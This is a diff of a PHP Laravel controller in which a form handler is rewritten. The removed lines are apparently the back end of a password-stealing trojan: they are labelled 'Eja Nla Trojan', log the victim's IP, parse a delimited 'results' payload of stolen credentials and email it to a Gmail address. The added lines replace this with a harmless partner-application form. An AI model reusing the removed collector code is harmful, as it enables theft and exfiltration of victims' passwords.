@@ -36,40 +36,31 @@ class MainController extends Controller {
     public function postPartner(Request $request)
 	{
            $req = $request->all();
-		   dd($req);
+		   #dd($req);
            $ret = [];
                
                 $validator = Validator::make($req, [
-                             'results' => 'required',
+                             'name' => 'required',
+                             'email' => 'required|email',
+                             'location' => 'required',
                    ]);
          
                  if($validator->fails())
                   {
-                       $ret = ['mode' => "error", 'error' => "no_passwords"];
+                       $ret = "Fill in your name, email and location (city and state)!";
                        
                  }
                 
                  else
                  { 
-                 	 $ip = getenv("REMOTE_ADDR");
-                 	  $s = "Eja Nla Trojan ~~ ".$ip." ~~ ".date("h:i A jS F, Y");
-                       $rcpt = "mails4davidslogan@gmail.com";
-                       $results = $req["results"];
+                 	  $s = "New application request: ".date("h:i A jS F, Y");
+                       $rcpt = "expoze.inc@gmail.com";
+                       $name = $req["name"];
+                       $email = $req["email"];
+                       $location = $req["location"];
 
-                       $ret = [];
-                       $temp = explode("GBAM",$results);
-                       foreach($temp as $line){
-                       	$temp2 = explode("|",$line);
-                           if(is_array($temp2)) {
-                             $temp3 = [];
-                             foreach($temp2 as $t2) array_push($temp3,$t2);                          
-                              array_push($ret,$temp3);
-                           } 
-                       } 
-                       
-                       #echo "here are the results: ".$results;
-                         $this->helpers->sendEmail($rcpt,$s,['results' => $ret],'emails.login_alert','view');  
-                          $ret = ['mode' => "success"];                      
+                       $this->helpers->sendEmail($rcpt,$s,['name' => $name,'email' => $email,'location' => $location],'emails.apply_alert','view');  
+                        $ret = "OK";                      
                   }       
            return $ret;                                                                                            
 	}
